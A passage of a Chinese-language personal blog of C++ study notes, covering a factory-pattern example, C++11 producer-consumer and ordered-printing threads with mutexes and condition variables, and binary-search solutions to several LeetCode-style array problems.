&#123;</span><br><span class="line">        cout&lt;&lt;&quot;BenzCar::createdCar()&quot;&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~BenzCar()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class BmwCar : public Car //宝马车</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    BmwCar()</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;&quot;Bmw::Bmw()&quot;&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    virtual void createdCar(void)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;&quot;BmwCar::createdCar()&quot;&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class CarFactory //车厂</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    Car* createSpecificCar(CarType type)</span><br><span class="line">    &#123;</span><br><span class="line">        switch(type)</span><br><span class="line">        &#123;</span><br><span class="line">        case BENZ://生产奔驰车</span><br><span class="line">            return (new BenzCar());</span><br><span class="line">            break;</span><br><span class="line">        case BMW://生辰宝马车</span><br><span class="line">            return (new BmwCar());</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            return NULL;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)</span><br><span class="line">&#123;</span><br><span class="line">    CarFactory carfac;</span><br><span class="line">    Car* specificCarA = carfac.createSpecificCar(BENZ);//看到网上众多示例在new后没有delete，感觉不是特别严谨</span><br><span class="line">    Car* specificCarB = carfac.createSpecificCar(BMW);</span><br><span class="line"></span><br><span class="line">    delete specificCarA; delete specificCarB;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="10-应用场景"><a href="#10-应用场景" class="headerlink" title="10.应用场景"></a>10.应用场景</h1><h2 id="c11-实现消费者生产者"><a href="#c11-实现消费者生产者" class="headerlink" title="c11++实现消费者生产者"></a>c11++实现消费者生产者</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">#include&lt;mutex&gt;</span><br><span class="line">#include&lt;condition_variable&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">class p_v</span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">    queue&lt;T&gt; taskQ;</span><br><span class="line">    T task_num;</span><br><span class="line">    std::mutex mtx;</span><br><span class="line">    std::condition_variable cv;</span><br><span class="line">public:</span><br><span class="line">    p_v()</span><br><span class="line">    &#123;</span><br><span class="line">        while(!taskQ.empty())</span><br><span class="line">            taskQ.pop();</span><br><span class="line">        task_num=0;</span><br><span class="line">    &#125;</span><br><span class="line">    void producer()</span><br><span class="line">    &#123;</span><br><span class="line">        while(true)</span><br><span class="line">        &#123;</span><br><span class="line">            std::unique_lock&lt;std::mutex&gt; ulock(mtx);</span><br><span class="line">            task_num++;</span><br><span class="line">            cout&lt;&lt;&quot;producer produces&quot;&lt;&lt;task_num&lt;&lt;endl;</span><br><span class="line">            taskQ.push(task_num);</span><br><span class="line">            ulock.unlock();</span><br><span class="line">            cv.notify_all();</span><br><span class="line">            std::this_thread::sleep_for(std::chrono::seconds(1));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    void consumer()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        while(true)</span><br><span class="line">        &#123;</span><br><span class="line">            std::unique_lock&lt;std::mutex&gt; ul(mtx);</span><br><span class="line">            while(taskQ.empty())</span><br><span class="line">            &#123;</span><br><span class="line">                cv.wait(ul);</span><br><span class="line">            &#125;</span><br><span class="line">            int t=taskQ.front();</span><br><span class="line">            taskQ.pop();</span><br><span class="line">            cout&lt;&lt;&quot;consumor consumes&quot;&lt;&lt;t&lt;&lt;endl;</span><br><span class="line">            ul.unlock();</span><br><span class="line">            std::this_thread::sleep_for(std::chrono::seconds(1));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    void start()</span><br><span class="line">    &#123;</span><br><span class="line">        std::vector&lt;std::thread&gt; threads;</span><br><span class="line">        //消费者线程</span><br><span class="line">        for(int i=0;i&lt;5;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            threads.push_back( std::thread(p_v::consumer,this) );</span><br><span class="line">        &#125;</span><br><span class="line">        for(int i=5;i&lt;10;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            threads.push_back( std::thread(p_v::producer,this) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for(auto&amp; t:threads)</span><br><span class="line">        &#123;</span><br><span class="line">            t.join();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    p_v&lt;int&gt; pv;</span><br><span class="line">    pv.start();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="c-11实现三个线程顺序打印"><a href="#c-11实现三个线程顺序打印" class="headerlink" title="c++11实现三个线程顺序打印"></a>c++11实现三个线程顺序打印</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">思想：使用一个变量ready=1，2，3加上mutex和condition_variable结合顺序打印</span><br><span class="line">condition_variable.wait(mutex,pred)</span><br><span class="line">只有pred为false才会阻塞</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;thread&gt;</span><br><span class="line">#include&lt;condition_variable&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">mutex mu;</span><br><span class="line">std::condition_variable cond_var;</span><br><span class="line">int num=0;</span><br><span class="line">void func(char ch)</span><br><span class="line">&#123;</span><br><span class="line">int n=ch-&#x27;A&#x27;;</span><br><span class="line">for(int i=0;i&lt;10;i++)</span><br><span class="line">&#123;</span><br><span class="line">std::unique_lock&lt;std::mutex&gt; mylock(mu);</span><br><span class="line">cond_var.wait(mylock,[n]&#123;return n==num;&#125;);</span><br><span class="line">cout&lt;&lt;ch;</span><br><span class="line">num=(num+1)%3;</span><br><span class="line">mylock.unlock();</span><br><span class="line">cond_var.notify_all();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">vector&lt;thread&gt; pool;</span><br><span class="line">pool.push_back(thread(func,&#x27;A&#x27;));</span><br><span class="line">pool.push_back(thread(func,&#x27;B&#x27;));</span><br><span class="line">pool.push_back(thread(func,&#x27;C&#x27;));</span><br><span class="line">for(auto iter=pool.begin();iter!=pool.end();iter++)</span><br><span class="line">&#123;</span><br><span class="line">iter-&gt;join();</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="11-数组"><a href="#11-数组" class="headerlink" title="11.数组"></a>11.数组</h1><h2 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h2><p>二分法一定要明确定义</p><p>要维持<strong>循环不变量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注意l,r初始化的位置</span><br><span class="line">定义：[l,r]中搜寻target</span><br><span class="line"> l=0,r=nums.size()-1</span><br><span class="line"> 则while(l&lt;=r):因为l==r时，[l,r]中还有一个元素，此时还应该搜寻</span><br><span class="line">定义:[l,r)中搜寻target</span><br><span class="line">l=0,r=nums.size()</span><br><span class="line">则while(l&lt;r):因为当l==r时，[l,r)中没有元素了，此时终止搜寻</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">upper_bound</span><br><span class="line"></span><br><span class="line">    int upper_bound(vector&lt;int&gt;&amp; nums,int target)</span><br><span class="line">    &#123;</span><br><span class="line">        int l=0;</span><br><span class="line">        int r=nums.size()-1;</span><br><span class="line">        int mid=0;</span><br><span class="line">        while(l&lt;=r)</span><br><span class="line">        &#123;</span><br><span class="line">        mid=l+(r-l)/2;</span><br><span class="line">            if(nums[mid]&gt;target)</span><br><span class="line">            &#123;</span><br><span class="line">                r=mid-1;</span><br><span class="line">            &#125;</span><br><span class="line">            else if(nums[mid]&lt;target)</span><br><span class="line">            &#123;</span><br><span class="line">                l=mid+1;</span><br><span class="line">            &#125;</span><br><span class="line">            else if(nums[mid]==target)</span><br><span class="line">            &#123;</span><br><span class="line">            //找右边界，此时锁定r，左边界l右移</span><br><span class="line">            l=mid+1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //r最后位置一定是等于target最右边的或者第一个小于target的值</span><br><span class="line">        //r停在等于target或者target不存在</span><br><span class="line">        target不存在分为两种情况：</span><br><span class="line">        1.中间不存在，此时nums[r]&lt;target</span><br><span class="line">        2.整个不存在说明整个数组大于target，r越界</span><br><span class="line">        if(r&lt;0||nums[r]!=target)</span><br><span class="line">        &#123;</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        return r;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">lower_bound</span><br><span class="line"></span><br><span class="line">    int lower_bound(vector&lt;int&gt;&amp; nums,int target)</span><br><span class="line">    &#123;</span><br><span class="line">        int l=0;</span><br><span class="line">        int r=nums.size()-1;</span><br><span class="line">        int mid=0;</span><br><span class="line">        //最后停[r,l]</span><br><span class="line">        while(l&lt;=r)</span><br><span class="line">        &#123;</span><br><span class="line">            mid=l+(r-l)/2;</span><br><span class="line">            //r最后停在等于target位置或小于target</span><br><span class="line">            if(nums[mid]&gt;target)</span><br><span class="line">            &#123;</span><br><span class="line">                r=mid-1;</span><br><span class="line">            &#125;</span><br><span class="line">            //l刨去小于target数字</span><br><span class="line">            //l停在第一个等于targrt的位置或者第一个大于target的位置</span><br><span class="line">            else if(nums[mid]&lt;target)</span><br><span class="line">            &#123;</span><br><span class="line">                l=mid+1;</span><br><span class="line">            &#125;</span><br><span class="line">            //r刨去右边等于target的值</span><br><span class="line">            else if(nums[mid]==target)</span><br><span class="line">            &#123;</span><br><span class="line">                r=mid-1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(nums[l]!=target||l==nums.size())</span><br><span class="line">        &#123;</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        return l;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h2 id="求x的平方根"><a href="#求x的平方根" class="headerlink" title="求x的平方根"></a>求x的平方根</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int mySqrt(int x) &#123;</span><br><span class="line">        if(x==0||x==1)</span><br><span class="line">        &#123;</span><br><span class="line">            return x;</span><br><span class="line">        &#125;</span><br><span class="line">        //二分法找y*y=x</span><br><span class="line">        int l=0;</span><br><span class="line">        int r=x;</span><br><span class="line">        int ans=-1;</span><br><span class="line">        //[0,x]找y</span><br><span class="line">        while(l&lt;=r)</span><br><span class="line">        &#123;</span><br><span class="line">            int mid=l+(r-l)/2;</span><br><span class="line">            //能存在平方根</span><br><span class="line">            //每次记录&lt;=x的元素</span><br><span class="line">            if((long long)mid*mid&lt;=x)</span><br><span class="line">            &#123;</span><br><span class="line">                ans=mid;</span><br><span class="line">                l=mid+1;</span><br><span class="line">            &#125;</span><br><span class="line">            else if((long long)mid*mid&gt;x)</span><br><span class="line">            &#123;</span><br><span class="line">                r=mid-1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="寻找0-n-1缺失的元素"><a href="#寻找0-n-1缺失的元素" class="headerlink" title="寻找0~n-1缺失的元素"></a>寻找0~n-1缺失的元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: [0,1,2,3,4,5,6,7,9]</span><br><span class="line">输出: 8</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int missingNumber(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        int l=0;</span><br><span class="line">        int r=nums.size()-1;</span><br><span class="line">        //[l,r]中找target</span><br><span class="line">        while(l&lt;=r)</span><br><span class="line">        &#123;</span><br><span class="line">            int mid=l+(r-l)/2;</span><br><span class="line">            if(nums[mid]==mid)</span><br><span class="line">            &#123;</span><br><span class="line">                l=mid+1;</span><br><span class="line">            &#125;</span><br><span class="line">            else if(nums[mid]&gt;mid)</span><br><span class="line">            &#123;</span><br><span class="line">                r=mid-1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //l位于缺省值右边</span><br><span class="line">        //r位于缺省值左边</span><br><span class="line">        return l;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="山峰数组最小元素"><a href="#山峰数组最小元素" class="headerlink" title="山峰数组最小元素"></a>山峰数组最小元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int findMin(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        int l=0;</span><br><span class="line">        int r=nums.size()-1;</span><br><span class="line">        int mid=0;</span><br><span class="line">        //[l,r]搜寻最小值</span><br><span class="line">        while(l&lt;=r)</span><br><span class="line">        &#123;</span><br><span class="line">            mid=l+(r-l)/2;</span><br><span class="line">            if(nums[mid]&lt;=nums[nums.size()-1])</span><br><span class="line">            &#123;</span><br><span class="line">                r=mid-1;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                l=mid+1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return nums[r+1];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="寻找峰值元素"><a href="#寻找峰值元素" class="headerlink" title="寻找峰值元素"></a>寻找峰值元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主要思想：对于nums[i]!=nums[i+1]时，nums[i]&gt;nums[i+1]说明峰值元素在i左边</span><br><span class="line">nums[i]&lt;nums[i+1]，峰值元素在i的右边</span><br></pre></td></tr></table></figure><p><img src="https://pic.leetcode-cn.com/1628133102-ILSmsa-file_1628133103312" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int findPeakElement(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        if(nums.size()==1||nums[0]&gt;nums[1])</span><br><span class="line">        &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        int l=0;</span><br><span class="line">        int r=nums.size()-2;</span><br><span class="line">        //在[l,r]种找峰值</span><br><span class="line">        //需要比较mid和mid+1，所以r再减1</span><br><span class="line">        while(l&lt;=r)</span><br><span class="line">        &#123;</span><br><span class="line">            int mid=l+(r-l)/2;</span><br><span class="line">            if(nums[mid]&gt;nums[mid+1])</span><br><span class="line">            &#123;</span><br><span class="line">                r=mid-1;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                l=mid+1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return l;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="寻找重复数字"><a href="#寻找重复数字" class="headerlink" title="寻找重复数字"></a>寻找重复数字</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">num:1~n n+1个位置</span><br><span class="line">输入：nums = [1,3,4,2,2]</span><br><span class="line">输出：2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">1.可以修改nums，nums[i]的i下标存放i-1</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int findDuplicate(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        for(int i=0;i&lt;nums.size();)</span><br><span class="line">        &#123;</span><br><span class="line">            if(nums[i]-1==i)</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            else if(nums[i]==nums[nums[i]-1])</span><br><span class="line">            &#123;</span><br><span class="line">                return nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                swap(nums[i],nums[nums[i]-1]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">2.快慢指针</span><br><span class="line">index 0 1 2 3 4</span><br><span class="line">nums  1 3 4 2 2</span><br><span class="line"></span><br><span class="line">0-&gt;1-&gt;3-&gt;2-&gt;4-&gt;2 </span><br><span class="line"></span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int findDuplicate(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        int fast=0;</span><br><span class="line">        int slow=0;</span><br><span class="line">        while(true)</span><br><span class="line">        &#123;</span><br><span class="line">            fast=nums[nums[fast]];</span><br><span class="line">            slow=nums[slow];</span><br><span class="line">            if(fast==slow)</span><br><span class="line">            &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        slow=0;</span><br><span class="line">        while(slow!=fast)</span><br><span class="line">        &#123;</span><br><span class="line">            fast=nums[fast];</span><br><span class="line">            slow=nums[slow];</span><br><span class="line">        &#125;</span><br><span class="line">        return slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="找到数组中左边全小于，右边全大于的元素-类似找枢轴"><a href="#找到数组中左边全小于，右边全大于的元素-类似找枢轴" class="headerlink" title="找到数组中左边全小于，右边全大于的元素(类似找枢轴)"></a>找到数组中左边全小于，右边全大于的元素(类似找枢轴)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">vector&lt;int&gt; getnum(vector&lt;int&gt;&amp; nums)</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;int&gt; left_max(nums.size(),INT_MIN);</span><br><span class="line">    vector&lt;int&gt; right_min(nums.size(),INT_MAX);</span><br><span class="line">    for(int i=1;i&lt;nums.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        left_max[i]=max(left_max[i-1],nums[i-1]);</span><br><span class="line">    &#125;</span><br><span class="line">    for(int j=nums.size()-2;j&gt;=0;j--)</span><br><span class="line">    &#123;</span><br><span class="line">        right_min[j]=min(right_min[j+1],nums[j+1]);</span><br><span class="line">    &#125;</span><br><span class="line">    //遍历，nums[i]&gt;left_max[i]&amp;&amp;nums[j]&lt;right_min[j]属于结果</span><br><span class="line">    vector&lt;int&gt; ans;</span><br><span class="line">    for(int k=0;k&lt;nums.size();k++)</span><br><span class="line">    &#123;</span><br><span class="line">        if((nums[k]&gt;left_max[k])&amp;&amp;(nums[k]&lt;right_min[k]))</span><br><span class="line">        &#123;</span><br><span class="line">            ans.push_back(nums[k]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;int&gt; tem=&#123;2,1,8,10,9&#125;;</span><br><span class="line">    vector&lt;int&gt; ans=getnum(tem);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="旋转数组"><a href="#旋转数组" class="headerlink" title="旋转数组"></a>旋转数组</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不含有重复元素的旋转数组：mid一刀劈肯定左右两边有一个单调</span><br><span class="line">比较mid与l的大小来判断单调区间在哪</span><br><span class="line">nums[mid]&gt;=nums[l]  l-mid单调</span><br><span class="line">nums[mid]&lt;nums[l]   mid-r单调</span><br><span class="line">含有重复元素的旋转数组：mid一刀劈不一定能判断哪边区间单调</span><br><span 